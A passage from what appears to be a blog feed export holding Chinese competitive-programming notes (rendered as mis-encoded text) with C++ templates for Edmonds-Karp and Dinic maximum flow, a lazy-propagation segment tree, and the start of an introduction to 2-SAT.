class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;P3376_7.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="built_in">sync</span>();</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m&gt;&gt;s&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">        <span class="keyword">int</span> x,y,w;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;y&gt;&gt;w;</span><br><span class="line">        <span class="built_in">add</span>(x,y,w);</span><br><span class="line">        <span class="built_in">add</span>(y,x,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">EK</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Dinicç®—æ³•"><a href="#Dinicç®—æ³•" class="headerlink" title="Dinicç®—æ³•"></a>Dinicç®—æ³•</h2><p>EKç®—æ³•è™½ç„¶æ¯”è¾ƒä¼˜äº†ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªæƒ…å†µè¿˜æ˜¯æ¯”è¾ƒè´¹æ—¶çš„ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º</p><p><img src="/2022/03/03/%E7%BD%91%E7%BB%9C%E6%B5%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/3.png" alt="3"></p><p>å‡è®¾æˆ‘ $S\to A$ å†ç»è¿‡æ›´å¤šçš„ç‚¹ï¼Œ$A$ åé¢çš„åˆ†æ”¯æ›´å¤šï¼Œé‚£ä¹ˆæ¯ä¸€æ¬¡éƒ½è¦ $\text{bfs}$  å¼€é”€ä¹Ÿæ˜¯å¾ˆå¤§çš„çš„ï¼Œé‡è¦çš„æ˜¯å¾ˆå¤šè·¯æˆ‘ä»¬ä¼šé‡å¤éå†ã€‚è¿™é‡Œå°±ä½“ç°å‡ºäº† $\text{Dinic}$ ç®—æ³•çš„ä¼˜äº†ã€‚</p><p>å®ƒåªéœ€è¦å¼€å§‹ä¸€æ¬¡ $\text{bfs}$ å°±èƒ½å¤„ç†å¤šæ¡è·¯å¾„ï¼Œå®ƒçš„æ€æƒ³æ˜¯è¿™æ ·çš„ï¼šå…ˆå¯¹ç½‘ç»œè¿›è¡Œ $\text{bfs}$ åˆ†å±‚ï¼Œæˆ‘åªæ‰¾è¿™æ ·çš„å¢å¹¿è·¯ï¼š</p><p>å¯¹äºè·¯å¾„ä¸Šä»»æ„ $u\to v$ çš„è¾¹ï¼Œéƒ½æœ‰ $v$ åœ¨ $u$ çš„ä¸‹ä¸€å±‚ã€‚æˆ‘ä¸€æ¬¡å¯ä»¥å¤„ç†å¤šæ¡å¢å¹¿è·¯ï¼Œå¦‚æœæ²¡æœ‰å¢å¹¿è·¯é‚£ä¹ˆæˆ‘å°†å¯¹ç½‘ç»œé‡æ–°åˆ†å±‚ï¼Œç›´åˆ° $\text{bfs}$ æ— æ³•éå†åˆ°æ±‡ç‚¹æ—¶ã€‚</p><p>æ ‡ç¨‹</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 505</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxe 5005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> w;</span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">&#125;edge[maxe&lt;&lt;<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> root[maxn],dep[maxn],cnt=<span class="number">1</span>,s,t,n,m,ans;</span><br><span class="line">queue&lt;<span class="keyword">int</span>&gt;q;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> w)</span></span>&#123;</span><br><span class="line">    edge[++cnt]=&#123;y,w,root[x]&#125;;</span><br><span class="line">    root[x]=cnt;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//ç½‘ç»œåˆ†å±‚ </span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">bfs</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//puts(&quot;1&quot;);</span></span><br><span class="line">    <span class="keyword">while</span>(q.<span class="built_in">size</span>())q.<span class="built_in">pop</span>();</span><br><span class="line">    q.<span class="built_in">push</span>(s);</span><br><span class="line">    <span class="built_in">memset</span>(dep,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(dep));</span><br><span class="line">    dep[s]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(q.<span class="built_in">size</span>())&#123;</span><br><span class="line">        <span class="keyword">int</span> u=q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=edge[i].next)&#123;</span><br><span class="line">            <span class="keyword">int</span> v=edge[i].to,w=edge[i].w;</span><br><span class="line">            <span class="keyword">if</span>(!dep[v]&amp;&amp;w)&#123;</span><br><span class="line">                dep[v]=dep[u]+<span class="number">1</span>;</span><br><span class="line">                q.<span class="built_in">push</span>(v);</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dep[t];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ä»uå‡ºå‘ï¼Œç›®å‰å·²æœ‰inçš„æµé‡ </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> u,<span class="keyword">int</span> in)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(u==t)<span class="keyword">return</span> in;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=edge[i].next)&#123;</span><br><span class="line">        <span class="keyword">int</span> v=edge[i].to,w=edge[i].w;</span><br><span class="line">        <span class="keyword">if</span>(dep[v]==dep[u]+<span class="number">1</span>&amp;&amp;w)&#123;</span><br><span class="line">            <span class="keyword">int</span> res=<span class="built_in">dfs</span>(v,<span class="built_in">min</span>(in,w));</span><br><span class="line">            edge[i].w-=res;</span><br><span class="line">            edge[i^<span class="number">1</span>].w+=res;</span><br><span class="line">            in-=res;</span><br><span class="line">            ans+=res;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(ans==<span class="number">0</span>)dep[u]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> ans;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sync</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="number">0</span>);</span><br><span class="line">    cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">sync</span>();</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m&gt;&gt;s&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">        <span class="keyword">int</span> x,y,w;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;y&gt;&gt;w;</span><br><span class="line">        <span class="built_in">add</span>(x,y,w);</span><br><span class="line">        <span class="built_in">add</span>(y,x,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">bfs</span>())&#123;</span><br><span class="line">        ans+=<span class="built_in">dfs</span>(s,<span class="number">0x7fffffffffffffff</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆä¸€ä¸ªæ¿å­æ”¶å…¥å›Šä¸­ï¼Œç½‘ç»œæµåº”è¯¥ä¼š $\text{Dcini}$ å·®ä¸å¤šäº†å§qwqã€‚</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> å›¾è®º </category>
          
          <category> ç½‘ç»œæµ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>çº¿æ®µæ ‘çš„å­¦ä¹ ç¬”è®°</title>
      <link href="/2022/02/25/%E7%BA%BF%E6%AE%B5%E6%A0%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/02/25/%E7%BA%BF%E6%AE%B5%E6%A0%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>æœ€è¿‘å¤ä¹ ä¸€ä¸‹çº¿æ®µæ ‘çš„æ¿å­ã€‚</p><span id="more"></span><p>å°±éšä¾¿å†™å§ï¼Œå°±å†™ç»™è‡ªå·±çœ‹çœ‹çš„ï¼Œå› ä¸ºå³ä¾¿æ˜¯æˆ‘å­¦è¿‡æ¿å­ï¼Œä¹ŸåŸºæœ¬ä¼šäº¤é”™å¾ˆå¤šæ¬¡ã€‚é¦–å…ˆä¸€ä¸ªå°±æ˜¯ä¸€å®šåœ¨å¼€å¤´åŠ ä¸Šä¸€å¥è¯ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯push_downçš„æ“ä½œï¼Œä¸€å®šæ˜¯æœ‰æ ‡è®°çš„æ—¶å€™å·²ç»åŠ å®Œäº†ï¼Œpush_downçš„æ—¶å€™å°±æ˜¯æŠŠæ ‡è®°åˆ†å‘ä¸‹å»ç„¶åç»™å­èŠ‚ç‚¹åŠ ä¸Šå€¼å’Œlazyæ ‡è®°ã€‚</p><p>åœ¨addæ“ä½œçš„æ—¶å€™ä¸€å®šè¦åŠ ä¸Šå…ˆpush_downå†åŠ ã€‚</p><h2 id="çº¿æ®µæ ‘è§£å†³é—®é¢˜çš„èŒƒå›´"><a href="#çº¿æ®µæ ‘è§£å†³é—®é¢˜çš„èŒƒå›´" class="headerlink" title="çº¿æ®µæ ‘è§£å†³é—®é¢˜çš„èŒƒå›´"></a>çº¿æ®µæ ‘è§£å†³é—®é¢˜çš„èŒƒå›´</h2><p>è¦æ±‚åœ¨çº¿ï¼Œå¹¶ä¸”å«æœ‰åŒºé—´åŠ æ³•å’ŒåŒºé—´æŸ¥è¯¢çš„æ“ä½œï¼Œä¸‹é¢æ˜¯æ´›è°·çš„æ¿å­é¢˜å¹¶ç»™å‡ºæ ‡ç¨‹ï¼Œä¹Ÿå¯ä»¥å½“æ¿å­ç”¨ã€‚</p><h2 id="æ¿å­"><a href="#æ¿å­" class="headerlink" title="æ¿å­"></a>æ¿å­</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 1000005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> lazy;</span><br><span class="line">    <span class="keyword">int</span> l;</span><br><span class="line">    <span class="keyword">int</span> r;</span><br><span class="line">    <span class="keyword">int</span> sum;</span><br><span class="line">    <span class="keyword">int</span> <span class="keyword">operator</span>+(<span class="keyword">const</span> eee &amp;a)&#123;</span><br><span class="line">        <span class="keyword">return</span> sum+a.sum;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">length</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (r-l+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">mid</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> l+r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;tree[maxn&lt;&lt;<span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> a[maxn],ans;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">build</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r ,<span class="keyword">int</span> now)</span></span>&#123;</span><br><span class="line">    tree[now].l=l;</span><br><span class="line">    tree[now].r=r;</span><br><span class="line">    <span class="keyword">if</span>(l==r)&#123;</span><br><span class="line">        tree[now].sum=a[l];</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> mid=l+r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">build</span>(l,mid,now&lt;&lt;<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">build</span>(mid+<span class="number">1</span>,r,now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>);</span><br><span class="line">    tree[now].sum=tree[now&lt;&lt;<span class="number">1</span>]+tree[now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">push_down</span><span class="params">(<span class="keyword">int</span> now)</span></span>&#123;</span><br><span class="line">    <span class="comment">//if(tree[now].l==tree[now].r)return;</span></span><br><span class="line">    <span class="keyword">int</span> lazy=tree[now].lazy;</span><br><span class="line">    tree[now&lt;&lt;<span class="number">1</span>].sum+=lazy*tree[now&lt;&lt;<span class="number">1</span>].<span class="built_in">length</span>();</span><br><span class="line">    tree[now&lt;&lt;<span class="number">1</span>].lazy+=lazy;</span><br><span class="line">    tree[now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].sum+=lazy*tree[now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].<span class="built_in">length</span>();</span><br><span class="line">    tree[now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].lazy+=lazy;</span><br><span class="line">    tree[now].lazy=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> num,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l&lt;=tree[i].l&amp;&amp;r&gt;=tree[i].r)&#123;</span><br><span class="line">        tree[i].sum+=num*(tree[i].r-tree[i].l+<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//tree[i].sum%=mod;</span></span><br><span class="line">        tree[i].lazy+=num;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">int</span> mid=tree[i].l+tree[i].r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(tree[i].lazy)<span class="built_in">push_down</span>(i);</span><br><span class="line">        <span class="keyword">if</span>(l&lt;=mid)<span class="built_in">add</span>(l,r,num,i&lt;&lt;<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(r&gt;mid)<span class="built_in">add</span>(l,r,num,i&lt;&lt;<span class="number">1</span>|<span class="number">1</span>);</span><br><span class="line">        tree[i].sum=(tree[i&lt;&lt;<span class="number">1</span>].sum+tree[i&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].sum);<span class="comment">//%mod;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l&lt;=tree[i].l&amp;&amp;r&gt;=tree[i].r)&#123;</span><br><span class="line">        ans+=tree[i].sum;</span><br><span class="line">    <span class="comment">//    ans%=mod;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(tree[i].lazy)<span class="built_in">push_down</span>(i);</span><br><span class="line">        <span class="keyword">int</span> mid=tree[i].l+tree[i].r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(l&lt;=mid)<span class="built_in">query</span>(l,r,i&lt;&lt;<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(r&gt;mid)<span class="built_in">query</span>(l,r,i&lt;&lt;<span class="number">1</span>|<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sync</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;1.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="number">0</span>);</span><br><span class="line">    cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">    cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">sync</span>();</span><br><span class="line">    <span class="keyword">int</span> n,t;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">build</span>(<span class="number">1</span>,n,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">while</span>(t--)&#123;</span><br><span class="line">        <span class="keyword">int</span> op,x,y,z;</span><br><span class="line">        cin&gt;&gt;op;</span><br><span class="line">        <span class="keyword">if</span>(op==<span class="number">1</span>)&#123;</span><br><span class="line">            cin&gt;&gt;x&gt;&gt;y&gt;&gt;z;</span><br><span class="line">            <span class="built_in">add</span>(x,y,z,<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            cin&gt;&gt;x&gt;&gt;y;</span><br><span class="line">            ans=<span class="number">0</span>;</span><br><span class="line">            <span class="built_in">query</span>(x,y,<span class="number">1</span>);</span><br><span class="line">            cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> æ•°æ®ç»“æ„ </category>
          
          <category> çº¿æ®µæ ‘ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2-SATå­¦ä¹ ç¬”è®°</title>
      <link href="/2022/02/23/2-SAT%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/02/23/2-SAT%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>å¾ˆå¼€å¿ƒï¼Œå›¾è®ºçš„çŸ¥è¯†ä¹Ÿæ˜¯ç§¯å°‘æˆå¤šï¼Œå›é¦–å¾€æ˜”ï¼Œæˆ‘å¯¹å›¾è®ºçš„ç®—æ³•ä»…é™äºæœ€çŸ­è·¯ç®—æ³•($\text {dijkstra}$)å’Œæœ€å°ç”Ÿæˆæ ‘($\text {kruskal&amp;prime}$) ã€‚ä»Šå¤©æ¥å­¦å­¦è¿™ä¸ª $\text {2-SAT}$ é—®é¢˜ã€‚</p><span id="more"></span><h2 id="2-SATç®€ä»‹"><a href="#2-SATç®€ä»‹" class="headerlink" title="2-SATç®€ä»‹"></a>2-SATç®€ä»‹</h2><blockquote><p>$\text {SAT}$ æ˜¯é€‚å®šæ€§ï¼ˆSatisfiabilityï¼‰é—®é¢˜çš„ç®€ç§°ã€‚ä¸€èˆ¬å½¢å¼ä¸º k - é€‚å®šæ€§é—®é¢˜ï¼Œç®€ç§° k-SATã€‚è€Œå½“ $k&gt;2$ æ—¶è¯¥é—®é¢˜ä¸º NP å®Œå…¨çš„ã€‚æ‰€ä»¥æˆ‘ä»¬åªç ”ç©¶ $k=2$ çš„æƒ…å†µã€‚</p><p>$\text {2-SAT}$ï¼Œç®€å•çš„è¯´å°±æ˜¯ç»™å‡º ä¸ªé›†åˆï¼Œæ¯ä¸ªé›†åˆæœ‰ä¸¤ä¸ªå…ƒç´ ï¼Œå·²çŸ¥è‹¥å¹²ä¸ª ï¼Œè¡¨ç¤º ä¸ çŸ›ç›¾ï¼ˆå…¶ä¸­ ä¸ å±äºä¸åŒçš„é›†åˆï¼‰ã€‚ç„¶åä»æ¯ä¸ªé›†åˆé€‰æ‹©ä¸€ä¸ªå…ƒç´ ï¼Œåˆ¤æ–­èƒ½å¦ä¸€å…±é€‰ ä¸ªä¸¤ä¸¤ä¸çŸ›ç›¾çš„å…ƒç´ ã€‚æ˜¾ç„¶å¯èƒ½æœ‰å¤šç§é€‰æ‹©æ–¹æ¡ˆï¼Œä¸€èˆ¬é¢˜ä¸­åªéœ€è¦æ±‚å‡ºä¸€ç§å³å¯ã€‚(from OI WIKI)</p></blockquote><p>æˆ‘æƒ³ä¸Šé¢è¯´çš„ä¹Ÿæ¯”æˆ‘è¯´çš„ç¨å¾®æ¸…æ¥šç‚¹äº†ï¼Œé‚£ä¹ˆä»–çš„ç°å®æ„ä¹‰æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿæ¯”è¾ƒå¸¸è§çš„å°±æ˜¯é€»è¾‘æ¨å¯¼äº†ã€‚</p><p>å‘Šè¯‰ä½ ç°åœ¨æœ‰ Aï¼ŒBï¼ŒCä¸‰ä¸ªäººï¼Œä¸”Aå’ŒBæ˜¯ç”·ç”Ÿï¼Œå¦‚æœBæ˜¯ç”·ç”Ÿï¼Œé‚£ä¹ˆCæ˜¯å¥³ç”Ÿã€‚é—®ä½ è¿™ä¸‰ä¸ªäººçš„æ€§åˆ«åˆ†åˆ«æ˜¯ä»€ä¹ˆï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“å¯ä»¥çŸ¥é“Aï¼ŒBä¸ºç”·ï¼ŒCä¸ºå¥³ã€‚</p><p>ç°åœ¨ä¸»è¦å°±æ˜¯è®©è®¡ç®—æœºå»è®¡ç®—è¿™ä¸ªé—®é¢˜æ€ä¹ˆåŠå‘¢ï¼Ÿé¦–å…ˆæœ‰ä¸€ç‚¹å¯ä»¥ç¡®å®šçš„å°±æ˜¯ï¼Œä¸€ä¸ªäººä¸èƒ½æ—¢æ˜¯ç”·åˆæ˜¯å¥³ã€‚å¦‚æœå­˜åœ¨è¿™æ ·çš„æ–­è¨€ï¼šå¦‚æœAæ˜¯ç”·ï¼Œé‚£ä¹ˆAæ˜¯å¥³ï¼Œè¿™æ ·çš„è¯Aåªèƒ½æ˜¯å¥³ï¼Œå› ä¸ºAä¸å¯èƒ½æ—¢æ˜¯ç”·åˆæ˜¯å¥³ï¼Œè¿™ä¸ªè§„å®šå°±ä¸ºæˆ‘ä»¬è§£å†³ $\text {2-SAT}$ é—®é¢˜æä¾›äº†æ€è·¯ã€‚</p><p>æˆ‘ä»¬å‡è®¾æœ‰ $n$ ä¸ªäººï¼Œé‚£ä¹ˆæˆ‘ä»¬å»ºä¸€ä¸ª $2\times n$ ä¸ªç‚¹çš„æœ‰å‘å›¾ï¼Œç¬¬å¦‚æœ $i\le n$ é‚£ä¹ˆç¬¬ $i$ ä¸ªç‚¹è¡¨ç¤º $i$ ä¸ºç”·ï¼Œ$i&gt;n$ é‚£ä¹ˆç¬¬ $i$ ä¸ªç‚¹è¡¨ç¤ºç¬¬ $i-n$ ä¸ªäººä¸ºå¥³ã€‚$i\to j$æœ‰å‘è¾¹å¾ˆæ˜¾ç„¶è¡¨ï¼šå¦‚æœé€‰æ‹©ç‚¹ $i$ï¼Œé‚£ä¹ˆä¸€å®šè¦é€‰æ‹©ç‚¹ $j$ï¼Œå¦‚æœæˆ‘ä»¬é€‰æ‹©ç‚¹ $i$ ï¼Œé‚£ä¹ˆç‚¹ $i+n$ æˆ–è€…æ˜¯ç‚¹ $i-n$ ä¸€å®šä¸èƒ½è¢«é€‰ä¸­ï¼Œå¦åˆ™æˆ‘ä»¬å°±è¯´ç‚¹ $i$ ä¸èƒ½è¢«é€‰æ‹©ã€‚æ‰€ä»¥ï¼Œå¦‚æœ $i$ ä¸ 